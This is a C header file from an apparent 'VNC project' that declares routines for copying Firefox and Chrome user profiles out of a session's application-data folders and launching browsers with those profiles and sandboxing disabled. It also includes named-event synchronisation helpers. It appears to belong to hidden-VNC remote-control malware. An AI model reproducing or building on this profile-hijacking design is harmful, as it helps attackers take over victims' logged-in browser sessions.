//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// VNC project. Version 1.6
//	
// module: browser.h
// $Revision: 194 $
// $Date: 2014-07-11 16:55:06 +0400 (Пт, 11 июл 2014) $
// description: 
//	common routines for browsers command line construction

#ifndef __BROWSER_H_
#define __BROWSER_H_

#define _BR_COMMMON_EVENT TEXT("BR")

#define LAPP_DATA_VAR_W     L"LOCALAPPDATA"
#define APP_DATA_VAR_W      L"APPDATA"

FORCEINLINE VOID _BR_ConstructName(PVNC_SESSION pSession,TCHAR *Event,LPTSTR szEventName)
{
	lstrcpy(szEventName,Event);
	lstrcat(szEventName,TEXT("_"));
	lstrcat(szEventName,pSession->SharedSection.Data->DesktopName);
}

FORCEINLINE HANDLE BR_CreateEvent(PVNC_SESSION pSession,TCHAR *Event)
{
	TCHAR szEventName[DESKTOP_NAME_LENGTH+50];
	BOOL fbResult = FALSE;

	_BR_ConstructName(pSession,Event,szEventName);
	return CreateEvent(NULL,TRUE,FALSE,szEventName);
}

FORCEINLINE BOOL BR_IsStarted(PVNC_SESSION pSession,TCHAR *Event)
{
	TCHAR szEventName[DESKTOP_NAME_LENGTH+50];
	HANDLE hHandle;
	BOOL fbResult = FALSE;

	_BR_ConstructName(pSession,Event,szEventName);
	if ( hHandle = OpenEvent(EVENT_MODIFY_STATE,FALSE,szEventName) )
	{
		fbResult = TRUE;
		CloseHandle(hHandle);
	}
	return fbResult;
}

FORCEINLINE HANDLE BR_EnterCriticalSection(PVNC_SESSION pSession)
{
	HANDLE hEvent = BR_CreateEvent(pSession,_BR_COMMMON_EVENT);
	if ( hEvent )
	{
		if ( GetLastError() == ERROR_ALREADY_EXISTS ){
			if ( WaitForSingleObject( hEvent, 600000 ) != WAIT_OBJECT_0 ){
				CloseHandle ( hEvent );
				hEvent = NULL;
			}
		}
	}
	return hEvent;
}

FORCEINLINE VOID BR_LeaveCriticalSection(PVNC_SESSION pSession, HANDLE hSection)
{
	if ( hSection ){
		SetEvent( hSection );
		CloseHandle(hSection);
	}
}

BOOL BR_IsIE( VOID );
BOOL BR_IsFF( VOID );
BOOL BR_IsCR( VOID );
BOOL BR_IsOPR( VOID );
BOOL BR_IsOPR_NEW( VOID );
BOOL BR_IsBrowser( VOID );

VOID BR_DetectAndInit(PVNC_SESSION pSession, LPWSTR szProcessPath, DWORD ProcessNameHash);

LPWSTR BR_GetTempProfileName(IN PVNC_SESSION pSession, IN LPWSTR Suffix);
LPWSTR 
	BR_GetProfileNameW(
		IN PVNC_SESSION pSession, 
		IN LPWSTR ProfileVarName, // env variable for profile
		IN LPWSTR BrowserProfileDir //browser profile directory: "Google\\Chrome\\User Data"
		);

DWORD 
	BR_CopyProfile(
		IN PVNC_SESSION pSession,
		IN LPWSTR BrowserPrefix, // FF or CR
		IN LPWSTR SrcPath,
		IN LPWSTR DstPath,
		IN LPWSTR ProcessName // optional
		);

WINERROR 
	BR_PrepareProfileAndGetCmdlineW(
		 IN PVNC_SESSION pSession, 
		 IN LPWSTR szProcessName,
		 IN LPWSTR ProfileVar, // env variable for profile
		 IN LPWSTR BrowserProfileDir, //browser profile directory: "Google\\Chrome\\User Data"
		 IN LPWSTR BrowserPrefix, // browser prefix like CR or OPR
		 IN LPWSTR ArgHead, // --user-data-dir=
		 IN LPWSTR ArgTail, // --no-sandbox --allow-no-sandbox-job....
		 OUT LPWSTR *pNewCommandLine
		 );

typedef WINERROR (*FUNC_GetCommandLineW)(PVNC_SESSION pSession, LPCWSTR szPath,LPWSTR *pNewCommandLine);

WINERROR 
	BR_GetCommandLineA(
		PVNC_SESSION pSession, 
		LPCSTR szPath,
		LPSTR *pNewCommandLine,
		FUNC_GetCommandLineW GetCommandLineWPtr
		);

PVOID XStatusStartThread(PVNC_SESSION pSession);
VOID XStatusStopThread(PVOID Context);

#endif //__BROWSER_H_